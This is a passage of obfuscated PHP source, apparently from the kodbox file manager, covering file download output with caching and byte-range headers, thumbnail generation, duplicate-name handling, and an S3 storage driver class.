($‹’Ï©« === !1 && !mime_support($€¹ñ¿‡ö)) { $€¹ñ¿‡ö = $á‹»»»­[120]; } header($á‹»»»­[121]); header($á‹»»»­[122] . $€¹ñ¿‡ö); $×ë×ù—Ó = rawurlencode($ğ¹¿¬š«); $×ë×ù—Ó = $á‹»»»­[118] . $×ë×ù—Ó . $á‹»»»­[123] . $×ë×ù—Ó; if ($‹’Ï©«) { header($á‹»»»­[124]); header($á‹»»»­[125] . $×ë×ù—Ó); } else { if ($èÍ–·ôå) { header($á‹»»»­[126] . $×ë×ù—Ó); } } header($á‹»»»­[127] . gmdate($á‹»»»­[110], time() + 3600 * 24 * 30) . $á‹»»»­[128]); header($á‹»»»­[129]); header($á‹»»»­[130]); header($á‹»»»­[131]); if (isset($_SERVER[$á‹»»»­[132]]) && strtotime($_SERVER[$á‹»»»­[132]]) == $Û–µÆ‘[$á‹»»»­[85]]) { header($á‹»»»­[133], !0, 304); die; } if (isset($_SERVER[$á‹»»»­[134]]) && $_SERVER[$á‹»»»­[134]] == $¹¹­«–£) { header($á‹»»»­[135] . $¹¹­«–£, !0, 304); die; } header($á‹»»»­[135] . $¹¹­«–£); header($á‹»»»­[136] . $œ•‘¡­¥ . $á‹»»»­[128]); header($á‹»»»­[137] . $ğ¹¿¬š«); header($á‹»»»­[138]); header($á‹»»»­[139] . $ÏŒò¨½); header($á‹»»»­[140]); if (!$‹’Ï©« && $»¾Íàó÷ == $á‹»»»­[141]) { if ($ÏŒò¨½ > 1024 * 1024 * 5) { die; } $ÅÑÍâÀÑ = $this->getContent($îÀöí”Ä); $ÅÑÍâÀÑ = Html::clearSVG($ÅÑÍâÀÑ); header($á‹»»»­[142] . strlen($ÅÑÍâÀÑ)); echo $ÅÑÍâÀÑ; die; } $ëĞ¯¬—÷ = strtolower($_SERVER[$á‹»»»­[143]]); if ($‰”Ï¾Ûè && $ëĞ¯¬—÷ && $¨ÒÖğÅ) { if (strstr($ëĞ¯¬—÷, $á‹»»»­[144])) { header($á‹»»»­[145] . $îÀöí”Ä); } else { if (strstr($ëĞ¯¬—÷, $á‹»»»­[146])) { header($á‹»»»­[147] . $îÀöí”Ä); } else { if (strstr($ëĞ¯¬—÷, $á‹»»»­[148])) { header($á‹»»»­[149] . $îÀöí”Ä); } } } if ($´îıäèä) { header($á‹»»»­[150] . $´îıäèä); } return; } if (isset($_SERVER[$á‹»»»­[151]])) { if (preg_match($á‹»»»­[152], $_SERVER[$á‹»»»­[151]], $Íœ½¼ë•)) { $ÒÜ·Óøû = intval($Íœ½¼ë•[1]); $ÒÜ·Óøû = $ÒÜ·Óøû <= 0 ? 0 : ($ÒÜ·Óøû >= $Æ½›Ÿå ? $Æ½›Ÿå : $ÒÜ·Óøû); if (!empty($Íœ½¼ë•[2])) { $…¸Å»Ë = intval($Íœ½¼ë•[2]); $Æ½›Ÿå = $…¸Å»Ë < $ÒÜ·Óøû ? $ÒÜ·Óøû : ($…¸Å»Ë >= $Æ½›Ÿå ? $Æ½›Ÿå : $…¸Å»Ë); } } header($á‹»»»­[153]); header("\x43\157\156\164\x65\156\164\55\x52\x61\x6e\x67\x65\72\40\142\x79\164\x65\x73\x20{$ÒÜ·Óøû}\55{$Æ½›Ÿå}\x2f" . $ÏŒò¨½); } else { header($á‹»»»­[154]); } header($á‹»»»­[155]); $™óş´á½ = !0; if ($_SERVER[$á‹»»»­[156]] == $á‹»»»­[157] && $ÏŒò¨½ > 1204 * 1024 * 1024 * 2) { $™óş´á½ = !1; } if ($™óş´á½) { header($á‹»»»­[158] . ($Æ½›Ÿå - $ÒÜ·Óøû + 1)); } if ($_SERVER[$á‹»»»­[159]] == $á‹»»»­[160]) { return; } $Ü—¥Óã = 1024 * 100; $ıÜÈË¹· = 0; if ($´îıäèä) { $ıÜÈË¹· = intval(1000 * 1000 * ($Ü—¥Óã / $´îıäèä)); } while ($ÒÜ·Óøû <= $Æ½›Ÿå) { $¯µà¶Ã¦ = timeFloat(); check_abort(); $Û“ªÍ¾Ï = $Æ½›Ÿå - $ÒÜ·Óøû + 1; if ($Û“ªÍ¾Ï <= $Ü—¥Óã) { $Ü—¥Óã = $Û“ªÍ¾Ï; } echo $this->fileSubstr($îÀöí”Ä, $ÒÜ·Óøû, $Ü—¥Óã); $ÒÜ·Óøû += $Ü—¥Óã; if ($Ü—¥Óã == $Û“ªÍ¾Ï) { $ÒÜ·Óøû = $Æ½›Ÿå + 1; } if ($ıÜÈË¹·) { $é‚İÈî = intval(1000 * 1000 * (timeFloat() - $¯µà¶Ã¦)); $ÀòÕº±„ = $ıÜÈË¹· - $é‚İÈî; if ($ÀòÕº±„ > 5) { usleep($ÀòÕº±„); } } } } public function fileOutServer($Ñöí„‘, $îÕêáÙì = false, $ã“Ş“±¿ = false, $ÇÅÖ·¶ = '') { $this->fileOut($Ñöí„‘, $îÕêáÙì, $ã“Ş“±¿, $ÇÅÖ·¶); } public function fileOutLink($ä—«ı) { header($_SERVER[™»È’øè][161] . $ä—«ı); die; } public function cacheMethod($ğ‘›”ÂÂ, $Äª¨Ø›Æ, $Ú‹ƒª¸ = null) { $Ü”ô‚” =& $_SERVER[™»È’øè]; static $†ŒÙå‡• = array(); $¬­ş™ = $Äª¨Ø›Æ ? ltrim($this->getPathOuter($Äª¨Ø›Æ), $Ü”ô‚”[8]) : $Ü”ô‚”[12]; $Ù•Ã–øâ = $Ü”ô‚”[162] . $ğ‘›”ÂÂ . $Ü”ô‚”[163] . rtrim($¬­ş™, $Ü”ô‚”[8]); if (is_null($ğ‘›”ÂÂ)) { $†ŒÙå‡• = array(); return; } if (is_null($Äª¨Ø›Æ)) { foreach ($†ŒÙå‡• as $Ù•Ã–øâ => $Î¸ç¡ùî) { if (!strstr($Ù•Ã–øâ, $Ü”ô‚”[162] . $ğ‘›”ÂÂ . $Ü”ô‚”[164])) { continue; } unset($†ŒÙå‡•[$Ù•Ã–øâ]); } return; } if (!is_null($Ú‹ƒª¸)) { $†ŒÙå‡•[$Ù•Ã–øâ] = $Ú‹ƒª¸; return; } $›˜ş¼úÄ = isset($†ŒÙå‡•[$Ù•Ã–øâ]) ? $†ŒÙå‡•[$Ù•Ã–øâ] : null; if (!is_null($›˜ş¼úÄ)) { return $›˜ş¼úÄ; } $›˜ş¼úÄ = $this->{$ğ‘›”ÂÂ}($Äª¨Ø›Æ); $†ŒÙå‡•[$Ù•Ã–øâ] = $›˜ş¼úÄ; return $›˜ş¼úÄ; } public function cacheMethodInfoSet($ÍµÎ‚™©, $ÕŸŞì½, $áÍó©Ê“ = false) { $ìØ§†¾Ê =& $_SERVER[™»È’øè]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ìØ§†¾Ê[165], $ÍµÎ‚™©, $ÕŸŞì½); $this->cacheMethod($ìØ§†¾Ê[166], $ÍµÎ‚™©, $ÕŸŞì½ ? !1 : !0); if (is_array($áÍó©Ê“)) { $this->cacheMethod($ìØ§†¾Ê[167], $ÍµÎ‚™©, $áÍó©Ê“); } } public function fileOutImage($Óµ­½ñÙ, $È•æÌÙæ = 250) { $å¯ÃË =& $_SERVER[™»È’øè]; set_timeout(); if (substr($Óµ­½ñÙ, 0, 4) == $å¯ÃË[148]) { $this->fileOutLink($Óµ­½ñÙ); } $ÏÇ™¸¾ˆ = $this->info($Óµ­½ñÙ); $¥Êå‚Ğ = !1; $ÑÙ•Âº€ = isset($GLOBALS[$å¯ÃË[168]]) ? $GLOBALS[$å¯ÃË[168]] : array(); if ($ÑÙ•Âº€ && $ÑÙ•Âº€[$å¯ÃË[169]] == $ÏÇ™¸¾ˆ[$å¯ÃË[84]]) { $ÏÇ™¸¾ˆ = $ÑÙ•Âº€; $œ‘êº¯Ú = $ÏÇ™¸¾ˆ[$å¯ÃË[170]]; if ($œ‘êº¯Ú && isset($œ‘êº¯Ú[$å¯ÃË[171]])) { if ($œ‘êº¯Ú[$å¯ÃË[171]] <= $È•æÌÙæ && $œ‘êº¯Ú[$å¯ÃË[172]] <= $È•æÌÙæ) { $¥Êå‚Ğ = !0; } } } if ($ÏÇ™¸¾ˆ[$å¯ÃË[76]] <= 1024 * 100 || $¥Êå‚Ğ || !function_exists($å¯ÃË[173]) || $ÏÇ™¸¾ˆ[$å¯ÃË[174]] == $å¯ÃË[175]) { return $this->fileOut($Óµ­½ñÙ, !1, $ÏÇ™¸¾ˆ[$å¯ÃË[32]]); } $¥Ê‡İïó = kodIO::hashPath($ÏÇ™¸¾ˆ); $ò Ä í· = "\x63\157\166\145\162\137{$¥Ê‡İïó}\137{$È•æÌÙæ}\56\160\156\x67"; $Ï¡Öß‰Ä = IO_PATH_SYSTEM_TEMP . $å¯ÃË[176]; $ü¿é¡«ó = IO::infoFullSimple($Ï¡Öß‰Ä); $åá°¹ÉÏ = $ü¿é¡«ó && is_array($ü¿é¡«ó) ? $ü¿é¡«ó[$å¯ÃË[84]] : $å¯ÃË[12]; if (!$åá°¹ÉÏ) { $åá°¹ÉÏ = IO::mkdir($Ï¡Öß‰Ä); } if ($ÏÇ™¸¾ˆ[$å¯ÃË[177]] == $å¯ÃË[178] && isset($ÏÇ™¸¾ˆ[$å¯ÃË[179]]) && $ÏÇ™¸¾ˆ[$å¯ÃË[179]] == kodIO::sourceID($åá°¹ÉÏ)) { $­§©™¨ˆ = $ÏÇ™¸¾ˆ[$å¯ÃË[180]]; if ($È•æÌÙæ <= 500) { $õıÙğ¯ª = preg_replace($å¯ÃË[181], $å¯ÃË[182], $ÏÇ™¸¾ˆ[$å¯ÃË[32]]); $­§©™¨ˆ = IO::fileNameExist($åá°¹ÉÏ, $õıÙğ¯ª); } return IO::fileOut(KodIO::make($­§©™¨ˆ), !1, $ÏÇ™¸¾ˆ[$å¯ÃË[32]]); } $ëß—ëí£ = IO::fileNameExist($åá°¹ÉÏ, $ò Ä í·); if ($ëß—ëí£) { return IO::fileOut(KodIO::make($ëß—ëí£), !1, $ÏÇ™¸¾ˆ[$å¯ÃË[32]]); } if ($È•æÌÙæ > 1000) { $this->makeImageCover($åá°¹ÉÏ, $Óµ­½ñÙ, $ò Ä í·, $È•æÌÙæ); $this->makeImageCover($åá°¹ÉÏ, $Óµ­½ñÙ, "\143\x6f\166\145\162\137{$¥Ê‡İïó}\x5f\x32\x35\60\x2e\160\x6e\x67", 250); $ëß—ëí£ = IO::fileNameExist($åá°¹ÉÏ, $ò Ä í·); if ($ëß—ëí£) { return IO::fileOut(KodIO::make($ëß—ëí£), !1, $ÏÇ™¸¾ˆ[$å¯ÃË[32]]); } die; } $—…¨°¼š = Cache::get($ò Ä í·); if ($—…¨°¼š == $å¯ÃË[183] || $—…¨°¼š == $å¯ÃË[184]) { echo $—…¨°¼š; die; } Cache::set($ò Ä í·, $å¯ÃË[184], 60); $â¥ºÅ¦¢ = array($åá°¹ÉÏ, $ÏÇ™¸¾ˆ[$å¯ÃË[84]], $ò Ä í·, $È•æÌÙæ); $ëÏŞÓƒã = $å¯ÃË[185] . $ÏÇ™¸¾ˆ[$å¯ÃË[76]] . $å¯ÃË[186] . $ò Ä í· . $å¯ÃË[187] . $ÏÇ™¸¾ˆ[$å¯ÃË[32]] . $å¯ÃË[188] . $ÏÇ™¸¾ˆ[$å¯ÃË[84]]; TaskQueue::add($å¯ÃË[189], $â¥ºÅ¦¢, $ëÏŞÓƒã, $ò Ä í·); } public function makeImageCover($õéêÓÏ, $Öäƒ›ä½, $‚µƒ¾¬, $Ì£¹Ö÷Ç) { $õ×³¸è =& $_SERVER[™»È’øè]; if (IO::fileNameExist($õéêÓÏ, $‚µƒ¾¬)) { return $õ×³¸è[190]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $öŠÜ‡† = DATA_THUMB . $‚µƒ¾¬; del_file($öŠÜ‡†); $³°®ã‰É = TEMP_FILES . $‚µƒ¾¬; if (!@file_exists($³°®ã‰É)) { $³°®ã‰É = IO::download($Öäƒ›ä½, $³°®ã‰É); } if (!@file_exists($³°®ã‰É)) { return $õ×³¸è[191]; } ImageThumb::createThumb($³°®ã‰É, $öŠÜ‡†, $Ì£¹Ö÷Ç, $Ì£¹Ö÷Ç * 10); if (@file_exists($öŠÜ‡†)) { Cache::remove($‚µƒ¾¬); return IO::move($öŠÜ‡†, $õéêÓÏ); } Cache::set($‚µƒ¾¬, $õ×³¸è[183], 600); del_file($öŠÜ‡†); return $õ×³¸è[192] . $³°®ã‰É . $õ×³¸è[71]; } public function fileOutImageServer($ã—¢Ñœ¯, $Ô®¢Ï”— = 250) { $this->fileOutImage($ã—¢Ñœ¯, $Ô®¢Ï”—); } public function fileNameAuto($Î°ı©º”, $êÃÙÔÇÖ, $”¿±íŒæ = REPEAT_RENAME, $ÛõÈğ²É = false) { $Í·şğÙ” =& $_SERVER[™»È’øè]; $â‰ï”åå = $Î°ı©º” === $Í·şğÙ”[12] ? $êÃÙÔÇÖ : rtrim($Î°ı©º”, $Í·şğÙ”[8]) . $Í·şğÙ”[8] . $êÃÙÔÇÖ; if ($”¿±íŒæ == REPEAT_REPLACE || !$this->exist($â‰ï”åå) || $ÛõÈğ²É && $”¿±íŒæ != REPEAT_RENAME_FOLDER) { return $êÃÙÔÇÖ; } if ($”¿±íŒæ == REPEAT_SKIP) { return !1; } $Ò–¯ıÂ³ = $Í·şğÙ”[10] . get_path_ext($êÃÙÔÇÖ); $Ò–¯ıÂ³ = $Ò–¯ıÂ³ == $Í·şğÙ”[10] || $ÛõÈğ²É ? $Í·şğÙ”[12] : $Ò–¯ıÂ³; $ó èèğ÷ = 1; $¤ø øÍœ = substr($êÃÙÔÇÖ, 0, strlen($êÃÙÔÇÖ) - strlen($Ò–¯ıÂ³)); $¬œó÷Ä = $¤ø øÍœ . "\50{$ó èèğ÷}\x29{$Ò–¯ıÂ³}"; while ($this->exist(rtrim($Î°ı©º”, $Í·şğÙ”[8]) . $Í·şğÙ”[8] . $¬œó÷Ä)) { $¬œó÷Ä = $¤ø øÍœ . "\x28{$ó èèğ÷}\51{$Ò–¯ıÂ³}"; $ó èèğ÷++; } return $¬œó÷Ä; } private function fileNameAutoList($‰â™éˆş, $Ğ€ê´ä¨, $Šã´¯†“ = false) { $¤˜ÃƒÁ =& $_SERVER[™»È’øè]; $éÚıØ÷¢ = $this->listPath($‰â™éˆş, !0); $éÚıØ÷¢ = array_merge($éÚıØ÷¢[$¤˜ÃƒÁ[82]], $éÚıØ÷¢[$¤˜ÃƒÁ[83]]); $¨êÏ„ = array_to_keyvalue($éÚıØ÷¢, $¤˜ÃƒÁ[12], $¤˜ÃƒÁ[32]); $¬›ÁñúÙ = $¤˜ÃƒÁ[10] . get_path_ext($Ğ€ê´ä¨); $¬›ÁñúÙ = $¬›ÁñúÙ == $¤˜ÃƒÁ[10] || $Šã´¯†“ ? $¤˜ÃƒÁ[12] : $¬›ÁñúÙ; $î«âÑ„¨ = substr($Ğ€ê´ä¨, 0, strlen($Ğ€ê´ä¨) - strlen($¬›ÁñúÙ)); $ªã¶Ş€ß = $î«âÑ„¨ . "\50\x30\51{$¬›ÁñúÙ}"; for ($£ê½®šÌ = 1; $£ê½®šÌ <= count($¨êÏ„) + 1; $£ê½®šÌ++) { $ªã¶Ş€ß = $î«âÑ„¨ . "\x28{$£ê½®šÌ}\x29{$¬›ÁñúÙ}"; if (!in_array_not_case($ªã¶Ş€ß, $¨êÏ„)) { return $ªã¶Ş€ß; } } return $ªã¶Ş€ß; } public function listAllFiles($êßë×ö, $•÷µ©ú) { $²éƒö¥‰ =& $_SERVER[™»È’øè]; if (empty($•÷µ©ú)) { return array(); } $ôü®µÚ— = array_keys($•÷µ©ú); $Ú‚¹ÜÃÊ = array(); $êßë×ö = trim($êßë×ö, $²éƒö¥‰[8]); foreach ($•÷µ©ú as $ëÍï¿…ñ => $¢ì¡×£®) { $æĞãÏ›â = ltrim(substr(trim($ëÍï¿…ñ, $²éƒö¥‰[8]), strlen($êßë×ö)), $²éƒö¥‰[8]); if (substr($ëÍï¿…ñ, -1) == $²éƒö¥‰[8]) { $æĞãÏ›â = rtrim($æĞãÏ›â, $²éƒö¥‰[8]) . $²éƒö¥‰[8]; } $Ú‚¹ÜÃÊ = array_merge($Ú‚¹ÜÃÊ, $this->slicePath($æĞãÏ›â)); } $ô—ø²° = array(); foreach (array_unique($Ú‚¹ÜÃÊ) as $ÍåĞò ¸) { $Ø½šÆ¥² = array($²éƒö¥‰[84] => $this->getPathOuter($²éƒö¥‰[8] . $êßë×ö . $²éƒö¥‰[8] . $ÍåĞò ¸), $²éƒö¥‰[75] => 1, $²éƒö¥‰[76] => 0); if (substr($ÍåĞò ¸, -1) != $²éƒö¥‰[8]) { $Ø½šÆ¥²[$²éƒö¥‰[75]] = 0; $¶³ò¹á = $this->getPath($êßë×ö . $²éƒö¥‰[8] . $ÍåĞò ¸); if (isset($•÷µ©ú[$¶³ò¹á])) { $ßİéÅú = $•÷µ©ú[$¶³ò¹á]; if (isset($ßİéÅú[$²éƒö¥‰[76]])) { $Ø½šÆ¥²[$²éƒö¥‰[76]] = intval($ßİéÅú[$²éƒö¥‰[76]]); } if (isset($ßİéÅú[$²éƒö¥‰[193]])) { $Ø½šÆ¥²[$²éƒö¥‰[85]] = intval($ßİéÅú[$²éƒö¥‰[193]]); } } } $ô—ø²°[] = $Ø½šÆ¥²; } return $ô—ø²°; } public function slicePath($«÷Ó‘ÌÁ) { $µ×òğ‘¬ =& $_SERVER[™»È’øè]; $ûÄ×Ô¨Ÿ = explode($µ×òğ‘¬[8], trim($«÷Ó‘ÌÁ, $µ×òğ‘¬[8])); $ğ¬½Õ¸¦ = 0; do { ++$ğ¬½Õ¸¦; $òˆ„œ’Æ[] = implode($µ×òğ‘¬[8], array_slice($ûÄ×Ô¨Ÿ, 0, $ğ¬½Õ¸¦)) . $µ×òğ‘¬[8]; } while ($ğ¬½Õ¸¦ < count($ûÄ×Ô¨Ÿ)); $òˆ„œ’Æ[count($ûÄ×Ô¨Ÿ) - 1] = $«÷Ó‘ÌÁ; return $òˆ„œ’Æ; } public function getHost() { $ÁÅŞ–á =& $_SERVER[™»È’øè]; $ıÇÁŞğ = parse_url(trim($this->domain, $ÁÅŞ–á[8])); $†ì¢ƒÅ = isset($ıÇÁŞğ[$ÁÅŞ–á[194]]) ? $ıÇÁŞğ[$ÁÅŞ–á[194]] : http_type(); $Ê£•œû = isset($ıÇÁŞğ[$ÁÅŞ–á[195]]) ? $ıÇÁŞğ[$ÁÅŞ–á[195]] : $ıÇÁŞğ[$ÁÅŞ–á[84]]; if (isset($ıÇÁŞğ[$ÁÅŞ–á[196]])) { $Ê£•œû .= $ÁÅŞ–á[4] . $ıÇÁŞğ[$ÁÅŞ–á[196]]; } return $†ì¢ƒÅ . $ÁÅŞ–á[197] . $Ê£•œû; } public function pathEncode($¬•“¨®—) { $ØóóÖÒ =& $_SERVER[™»È’øè]; return str_replace($ØóóÖÒ[198], $ØóóÖÒ[8], rawurlencode($¬•“¨®—)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($»òŸ„Ÿ×) { set_timeout(); require_once SDK_DIR . $_SERVER[™»È’øè][199]; parent::__construct(); $this->_init($»òŸ„Ÿ×); } public function _init($°”şõĞ) { $this->config = $°”şõĞ; foreach ($°”şõĞ as $÷µÓæó§ => $…›‡ÃÙı) { if (isset($this->{$÷µÓæó§})) { $this->{$÷µÓæó§} = $…›‡ÃÙı; } } $this->endpoint = $°”şõĞ[$_SERVER[™»È’øè][200]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ÙˆÎû†û = "\x76\x34") { $this->signVer = $ÙˆÎû†û; $this->client->setSignatureVersion($ÙˆÎû†û); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $üü„îŠó =& $_SERVER[™»È’øè]; $¹„ «¿‘ = $this->getBucketCors(); if (!$¹„ «¿‘ || !is_array($¹„ «¿‘)) { return !1; } if ($¹„ «¿‘[$üü„îŠó[201]] != $üü„îŠó[202] || $¹„ «¿‘[$üü„îŠó[203]] != $üü„îŠó[202]) { return !1; } $›ÀËœ¹ş = array_map($üü„îŠó[204], $¹„ «¿‘[$üü„îŠó[205]]); if (!is_array($›ÀËœ¹ş)) { $›ÀËœ¹ş = array(); } $ê³Çœ‡ = array($üü„îŠó[206], $üü„îŠó[207], $üü„îŠó[208], $üü„îŠó[209], $üü„îŠó[210]); $‡û±×ü« = array_diff($ê³Çœ‡, $›ÀËœ¹ş); return empty($‡û±×ü«); } public function mkfile($ š½éÊ, $è‡Á¿Á¿ = '', $±àæşö = REPEAT_RENAME) { $¯Š¡Ã = $this->setContent($ š½éÊ, $è‡Á¿Á¿); if ($¯Š¡Ã !== !1) { return $this->getPathOuter($ š½éÊ); } return !1; } public function mkdir($£Ãú¢ñş, $ßÔ²Çïº = REPEAT_SKIP) { $™ªªÆÇÜ =& $_SERVER[™»È’øè]; if (empty($£Ãú¢ñş) && $£Ãú¢ñş !== $™ªªÆÇÜ[211]) { return !1; } if ($ßÔ²Çïº && $this->_isFolder($£Ãú¢ñş)) { return $this->getPathOuter($£Ãú¢ñş); } $›ç—ü²İ = $this->setContent($£Ãú¢ñş, $™ªªÆÇÜ[12], !0); if ($›ç—ü²İ !== !1) { return $this->getPathOuter($£Ãú¢ñş); } return !1; } public function copyFile($õ‡ùÃ­µ, $ö¢ºñû…, $ÇÖ÷œ‹ø = array()) { $í€õ¯¸Ì =& $_SERVER[™»È’øè]; $×‹âçğ¨ = $this->objectMeta($õ‡ùÃ­µ); if (!$×‹âçğ¨) { return !1; } if ($×‹âçğ¨[$í€õ¯¸Ì[76]] <= 1024 * 1024 * 200) { $Â‚¬÷— = $this->client->copyObject($this->bucket, $õ‡ùÃ­µ, $this->bucket, $ö¢ºñû…, $í€õ¯¸Ì[212], $ÇÖ÷œ‹ø); } else { $Â‚¬÷— = $this->client->multiCopyObject($this->bucket, $õ‡ùÃ­µ, $this->bucket, $ö¢ºñû…, $ÇÖ÷œ‹ø); } $Â‚¬÷— = $Â‚¬÷— ? $this->getPathOuter($ö¢ºñû…) : !1; return $Â‚¬÷—; } public function moveFile($íË¨ÂÛË, $ßÒÍíğ) { if ($this->copyFile($íË¨ÂÛË, $ßÒÍíğ)) { $this->delFile($íË¨ÂÛË); return $this->getPathOuter($ßÒÍíğ); } return !1; } public function delFile($ìÂ’¢Ñ) { return $this->client->deleteObject($this->bucket, $ìÂ’¢Ñ); } public function delFolder($º¼âÇËŸ) { $¢çÛÍÃ =& $_SERVER[™»È’øè]; if (!$this->exist($º¼âÇËŸ)) { return !0; } $this->listItemCache = !1; $ªú‘‘œ = $this->fileList($º¼âÇËŸ); $this->listItemCache = !0; $—‘Éáê¤ = trim($º¼âÇËŸ, $¢çÛÍÃ[8]) . $¢çÛÍÃ[8]; if (!empty($º¼âÇËŸ) && $º¼âÇËŸ !== $¢çÛÍÃ[211] && !in_array($—‘Éáê¤, $ªú‘‘œ[$¢çÛÍÃ[82]])) { $ªú‘‘œ[$¢çÛÍÃ[82]][] = $—‘Éáê¤; } $üÙêÂÓ’ = $this->delByBatch($ªú‘‘œ[$¢çÛÍÃ[83]]); if (!$üÙêÂÓ’) { return !1; } $üÙêÂÓ’ = $this->delByBatch($ªú‘‘œ[$¢çÛÍÃ[82]]); if (!$üÙêÂÓ’) { return !1; } return $this->delFile($—‘Éáê¤); } private function delByBatch($×„Ïâš²) { foreach (array_chunk($×„Ïâš², 1000) as $£·ñ°ú™) { $Ê«Œïë¸ = $this->client->deleteObjects($this->bucket, $£·ñ°ú™); if (!$Ê«Œïë¸) { return !1; } } return !0; } public function rename($å„ıø·, $•½ÈÙù) { return $this->renameObject($å„ıø·, $•½ÈÙù); } public function listPath($­Ö’ãÅü, $º‹œÏ÷ï = false) { $ŒööÜŞã =& $_SERVER[™»È’øè]; $¿ã–šÇ = $this->fileList($­Ö’ãÅü, $ŒööÜŞã[8], !0); foreach ($¿ã–šÇ[$ŒööÜŞã[82]] as $…úºÉ”ô => $õ©Àüı) { $¿ã–šÇ[$ŒööÜŞã[82]][$…úºÉ”ô] = $this->folderInfo($õ©Àüı, $º‹œÏ÷ï, $õ©Àüı); } foreach ($¿ã–šÇ[$ŒööÜŞã[83]] as $…úºÉ”ô => $õ©Àüı) { $¿ã–šÇ[$ŒööÜŞã[83]][$…úºÉ”ô] = $this->fileInfo($õ©Àüı[$ŒööÜŞã[32]], $º‹œÏ÷ï, $õ©Àüı); } return $¿ã–šÇ; } protected function infoChildren($¨Ï‹‰½, &$¾¥Ù®èë) { $¿ëÌŒöá =& $_SERVER[™»È’øè]; $¥İ ŞŸ = $this->fileList($¨Ï‹‰½, $¿ëÌŒöá[12], !0); $¾¥Ù®èë[$¿ëÌŒöá[78]] += count($¥İ ŞŸ[$¿ëÌŒöá[82]]); $¾¥Ù®èë[$¿ëÌŒöá[77]] += count($¥İ ŞŸ[$¿ëÌŒöá[83]]); foreach ($¥İ ŞŸ[$¿ëÌŒöá[83]] as $ó×•ˆ±ü) { if (!$ó×•ˆ±ü || !$ó×•ˆ±ü[$¿ëÌŒöá[76]]) { continue; } $¾¥Ù®èë[$¿ëÌŒöá[76]] += $ó×•ˆ±ü[$¿ëÌŒöá[76]]; } } private function fileInfo($™ƒºĞ›Å, $¡¸‹µÏŠ = false, $•ÎÔ­¹ = array()) { $°ßƒÊ¿ç =& $_SERVER[™»È’øè]; $µê›ïÌ‡ = array($°ßƒÊ¿ç[32] => $this->pathThis($™ƒºĞ›Å), $°ßƒÊ¿ç[84] => $this->getPathOuter($™ƒºĞ›Å), $°ßƒÊ¿ç[33] => $°ßƒÊ¿ç[213], $°ßƒÊ¿ç[174] => $this->ext($™ƒºĞ›Å), $°ßƒÊ¿ç[76] => isset($•ÎÔ­¹[$°ßƒÊ¿ç[76]]) ? $•ÎÔ­¹[$°ßƒÊ¿ç[76]] : 0); if ($¡¸‹µÏŠ) { return $µê›ïÌ‡; } $µê›ïÌ‡[$°ßƒÊ¿ç[214]] = $µê›ïÌ‡[$°ßƒÊ¿ç[85]] = 0; $µê›ïÌ‡[$°ßƒÊ¿ç[215]] = $µê›ïÌ‡[$°ßƒÊ¿ç[216]] = !0; if (empty($•ÎÔ­¹)) { $•ÎÔ­¹ = $this->objectMeta($™ƒºĞ›Å); if (!$•ÎÔ­¹) { return $µê›ïÌ‡; } } if (isset($•ÎÔ­¹[$°ßƒÊ¿ç[217]]) && $•ÎÔ­¹[$°ßƒÊ¿ç[217]]) { $µê›ïÌ‡[$°ßƒÊ¿ç[218]] = $•ÎÔ­¹[$°ßƒÊ¿ç[217]]; } if (isset($•ÎÔ­¹[$°ßƒÊ¿ç[193]])) { $µê›ïÌ‡[$°ßƒÊ¿ç[85]] = $•ÎÔ­¹[$°ßƒÊ¿ç[193]]; } if (isset($•ÎÔ­¹[$°ßƒÊ¿ç[76]])) { $µê›ïÌ‡[$°ßƒÊ¿ç[76]] = $•ÎÔ­¹[$°ßƒÊ¿ç[76]]; } return $µê›ïÌ‡; } private function folderInfo($…¿ù§ŸĞ, $Î•óÄò = false, $ËªˆÙ¢ = array()) { $¹¨¸ÄĞ =& $_SERVER[™»È’øè]; $ÓİÑƒÖë = array($¹¨¸ÄĞ[32] => $this->pathThis($…¿ù§ŸĞ), $¹¨¸ÄĞ[84] => $this->getPathOuter($¹¨¸ÄĞ[8] . $…¿ù§ŸĞ), $¹¨¸ÄĞ[33] => $¹¨¸ÄĞ[75]); if ($Î•óÄò) { return $ÓİÑƒÖë; } $ÓİÑƒÖë[$¹¨¸ÄĞ[214]] = $ÓİÑƒÖë[$¹¨¸ÄĞ[85]] = 0; $ÓİÑƒÖë[$¹¨¸ÄĞ[215]] = $ÓİÑƒÖë[$¹¨¸ÄĞ[216]] = !0; if ($…¿ù§ŸĞ == $¹¨¸ÄĞ[12]) { return $ÓİÑƒÖë; } if (empty($ËªˆÙ¢)) { $ËªˆÙ¢ = $this->objectMeta(trim($…¿ù§ŸĞ, $¹¨¸ÄĞ[8]) . $¹¨¸ÄĞ[8]); } if (isset($ËªˆÙ¢[$¹¨¸ÄĞ[193]])) { $ÓİÑƒÖë[$¹¨¸ÄĞ[214]] = $ËªˆÙ¢[$¹¨¸ÄĞ[193]]; } return $ÓİÑƒÖë; } private function fileList($´ÁÏÃßÚ, $é„ÎÌüÇ = '', $´èËóÛâ = 0) { $Ç©àäİ¿ =& $_SERVER[™»È’øè]; $×Ãõ×ò© = rtrim($´ÁÏÃßÚ, $Ç©àäİ¿[8]) . $Ç©àäİ¿[8]; $Ùåé¹´Î = $this->listObjs($×Ãõ×ò©, null, null, $é„ÎÌüÇ); if (!$Ùåé¹´Î) { return array($Ç©àäİ¿[82] => array(), $Ç©àäİ¿[83] => array()); } $…Ö¥Ú³ù = $ÇŸé”íí = array(); foreach ($Ùåé¹´Î[$Ç©àäİ¿[219]] as $£­Ÿµ³”) { $ÃÆôœÑ¦ = $£­Ÿµ³”[$Ç©àäİ¿[32]]; if ($ÃÆôœÑ¦ == $×Ãõ×ò©) { continue; } $Èîˆ›¢¼ = isset($£­Ÿµ³”[$Ç©àäİ¿[76]]) ? $£­Ÿµ³”[$Ç©àäİ¿[76]] : 0; $å”š‹²Ÿ = $Èîˆ›¢¼ == 0 && substr($ÃÆôœÑ¦, 